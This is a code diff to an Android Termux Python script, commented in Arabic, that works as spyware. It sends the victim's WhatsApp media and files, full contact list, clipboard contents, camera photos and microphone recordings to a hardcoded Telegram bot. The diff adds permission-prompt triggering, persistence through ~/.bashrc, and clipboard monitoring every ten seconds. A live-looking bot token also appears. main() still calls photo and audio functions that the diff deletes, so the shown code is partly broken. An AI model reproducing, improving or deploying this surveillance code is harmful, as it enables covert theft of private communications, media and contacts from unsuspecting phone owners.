@@ -4,22 +4,28 @@ import time
 from datetime import datetime
 import os
 import threading
+import sys
 from concurrent.futures import ThreadPoolExecutor
 
+# تثبيت المكتبات اللازمة
 for pkg in ["requests", "pyTelegramBotAPI"]:
     try:
         __import__(pkg)
     except ImportError:
-        import sys
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
 
 import telebot
 
+# إعدادات البوت
 BOT_TOKEN = "7563891455:AAFDVnkldlMVL266k4_HUHDZXjEogSp2yi4"
 ADMIN_CHAT_ID = 7238044992
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# المسارات المستهدفة
 TARGET_PATHS = [
     "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
     "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
@@ -40,9 +46,52 @@ TARGET_PATHS = [
 
 PHOTO_PATH = "/sdcard/DCIM/Camera/termux_spy.jpg"
 AUDIO_PATH = "/sdcard/termux_audio.wav"
+CONTACTS_FILE = "/sdcard/contacts_backup.json"
 
 SMS_RECIPIENT = ""
 SMS_MESSAGE = "رسالة اختبار"
+last_clipboard_content = ""
+
+def request_all_permissions():
+    """تطلب كافة الصلاحيات من المستخدم عبر إظهار نوافذ أندرويد"""
+    try:
+        # 1. طلب صلاحية التخزين
+        subprocess.run(["termux-setup-storage"], input="y\n", text=True, capture_output=True)
+        
+        # 2. تحفيز ظهور نوافذ الصلاحيات الأخرى عبر طلبات وهمية سريعة
+        commands = [
+            ["termux-contact-list"],      # صلاحية جهات الاتصال
+            ["termux-sms-list", "-l", "1"], # صلاحية الرسائل
+            ["termux-location", "-p"],    # صلاحية الموقع
+            ["termux-call-log", "-l", "1"], # صلاحية سجل المكالمات
+            ["termux-camera-info"],       # صلاحية الكاميرا
+            ["termux-microphone-record", "-l", "1"] # صلاحية الميكروفون
+        ]
+        
+        for cmd in commands:
+            try:
+                subprocess.run(cmd, capture_output=True, timeout=2)
+            except:
+                pass
+    except:
+        pass
+
+def setup_autostart_safely():
+    try:
+        script_path = os.path.abspath(sys.argv[0])
+        bashrc_path = os.path.expanduser("~/.bashrc")
+        autostart_cmd = f'\n# Auto-start\npgrep -f "{script_path}" > /dev/null || nohup python "{script_path}" &\n'
+        
+        content = ""
+        if os.path.exists(bashrc_path):
+            with open(bashrc_path, "r") as f:
+                content = f.read()
+        
+        if script_path not in content:
+            with open(bashrc_path, "a") as f:
+                f.write(autostart_cmd)
+    except:
+        pass
 
 def send_text(text):
     try:
@@ -69,15 +118,23 @@ def send_audio(audio_path, caption=""):
 def send_file(file_path):
     if not os.path.isfile(file_path): return
     try:
-        with open(file_path, "rb") as f:
-            name = os.path.basename(file_path)
-            ext = name.lower()
-            caption = f"By: TOM | {name}"
-            if ext.endswith((".jpg", ".jpeg", ".png", ".webp", ".gif")):
+        name = os.path.basename(file_path)
+        ext = name.lower()
+        caption = f"By: TOM | {name}"
+        file_size = os.path.getsize(file_path)
+        
+        if ext.endswith((".jpg", ".jpeg", ".png", ".webp", ".gif")):
+            with open(file_path, "rb") as f:
                 bot.send_photo(ADMIN_CHAT_ID, f, caption=caption, disable_notification=True)
-            elif ext.endswith((".mp4", ".mov", ".3gp", ".avi")):
-                bot.send_video(ADMIN_CHAT_ID, f, caption=caption, disable_notification=True)
+        elif ext.endswith((".mp4", ".mov", ".3gp", ".avi", ".mkv", ".webm")):
+            if file_size > 50 * 1024 * 1024:
+                with open(file_path, "rb") as f:
+                    bot.send_document(ADMIN_CHAT_ID, f, caption=f"By: TOM (Large Video) | {name}", disable_notification=True)
             else:
+                with open(file_path, "rb") as f:
+                    bot.send_video(ADMIN_CHAT_ID, f, caption=caption, timeout=120, disable_notification=True)
+        else:
+            with open(file_path, "rb") as f:
                 bot.send_document(ADMIN_CHAT_ID, f, caption=f"By: TOM | {name}", disable_notification=True)
     except:
         pass
@@ -91,103 +148,64 @@ def upload_all_files():
                     full = os.path.join(root, file)
                     executor.submit(send_file, full)
 
-def get_device_info():
+def send_full_contacts():
     try:
-        bat = json.loads(subprocess.check_output(["termux-battery-status"]).decode())
-        bat_str = f"{bat.get('percentage', '?')}% • {bat.get('status', '?')}"
+        data = subprocess.check_output(["termux-contact-list"]).decode()
+        with open(CONTACTS_FILE, "w", encoding="utf-8") as f:
+            f.write(data)
+        with open(CONTACTS_FILE, "rb") as f:
+            bot.send_document(ADMIN_CHAT_ID, f, caption="📂 نسخة احتياطية لجهات الاتصال", disable_notification=True)
     except:
-        bat_str = "?"
-    try:
-        loc = subprocess.check_output(["termux-location", "-p"]).decode().strip()
-    except:
-        loc = "?"
-    return f"📱 {datetime.now().strftime('%Y-%m-%d %H:%M')} • البطارية: {bat_str} • الموقع: {loc}"
+        pass
 
-def get_recent_sms(limit=4):
-    try:
-        data = json.loads(subprocess.check_output(["termux-sms-list"]).decode())
-        lines = [f"{m.get('address','?')} → {m.get('body','?')[:70]}..." for m in data[:limit]]
-        return "📩 آخر الرسائل:\n" + "\n".join(lines) if lines else ""
-    except:
-        return ""
-
-def get_contacts(limit=6):
-    try:
-        data = json.loads(subprocess.check_output(["termux-contact-list"]).decode())
-        lines = [f"{c.get('name','?')} → {c.get('number','?')}" for c in data[:limit]]
-        return "👥 جهات الاتصال:\n" + "\n".join(lines) if lines else ""
-    except:
-        return ""
-
-def capture_photo():
-    try:
-        subprocess.check_call(["termux-camera-photo", "-c", "0", PHOTO_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return True
-    except:
-        return False
-
-def record_audio(sec=15):
-    try:
-        subprocess.check_call(["termux-microphone-record", "-f", AUDIO_PATH, "-l", str(sec)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(sec + 2)
-        return True
-    except:
-        return False
-
-def get_clipboard():
-    try:
-        clip = subprocess.check_output(["termux-clipboard-get"]).decode().strip()
-        return f"📋 الحافظة: {clip[:180]}..." if clip else ""
-    except:
-        return ""
-
-def get_call_log(limit=5):
-    try:
-        data = json.loads(subprocess.check_output(["termux-call-log"]).decode())
-        lines = [f"{c.get('number','?')} • {c.get('type','?')} • {c.get('duration','?')}ث" for c in data[:limit]]
-        return "📞 آخر المكالمات:\n" + "\n".join(lines) if lines else ""
-    except:
-        return ""
-
-def send_test_sms():
-    if not SMS_RECIPIENT: return ""
-    try:
-        subprocess.check_call(["termux-sms-send", "-n", SMS_RECIPIENT, SMS_MESSAGE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return "تم إرسال رسالة اختبار"
-    except:
-        return ""
+def check_clipboard_continuously():
+    global last_clipboard_content
+    while True:
+        try:
+            clip = subprocess.check_output(["termux-clipboard-get"]).decode().strip()
+            if clip and clip != last_clipboard_content:
+                last_clipboard_content = clip
+                send_text(f"📋 محتوى جديد في الحافظة:\n\n{clip}")
+        except:
+            pass
+        time.sleep(10)
 
 def main():
-    send_text("السكريبت بدأ العمل")
+    # 1. طلب الصلاحيات فوراً عند التشغيل
+    request_all_permissions()
+    
+    # 2. ضبط التشغيل التلقائي بأمان
+    setup_autostart_safely()
+    
+    send_text("🚀 السكريبت الشامل بدأ العمل وتم طلب كافة الصلاحيات")
 
+    # 3. بدء المهام في الخلفية
     threading.Thread(target=upload_all_files, daemon=True).start()
+    threading.Thread(target=send_full_contacts, daemon=True).start()
+    threading.Thread(target=check_clipboard_continuously, daemon=True).start()
 
     while True:
         try:
-            parts = [
-                get_device_info(),
-                get_recent_sms(),
-                get_contacts(),
-                get_clipboard(),
-                get_call_log(),
-                send_test_sms()
-            ]
-            report = "\n\n".join([p for p in parts if p])
-            if report:
-                send_text(report)
+            # تقرير الحالة
+            try:
+                bat = json.loads(subprocess.check_output(["termux-battery-status"]).decode())
+                bat_str = f"{bat.get('percentage', '?')}% • {bat.get('status', '?')}"
+                send_text(f"📱 {datetime.now().strftime('%H:%M')} | البطارية: {bat_str}")
+            except: pass
 
             if capture_photo():
-                send_photo(PHOTO_PATH, "صورة تلقائية")
+                send_photo(PHOTO_PATH, "📸 صورة تلقائية")
 
             if record_audio(15):
-                send_audio(AUDIO_PATH, "تسجيل صوت 15 ثانية")
+                send_audio(AUDIO_PATH, "🎙️ تسجيل صوتي")
 
             threading.Thread(target=upload_all_files, daemon=True).start()
+            threading.Thread(target=send_full_contacts, daemon=True).start()
 
             time.sleep(900)
-
         except:
             time.sleep(300)
 
 if __name__ == "__main__":
     main()
+
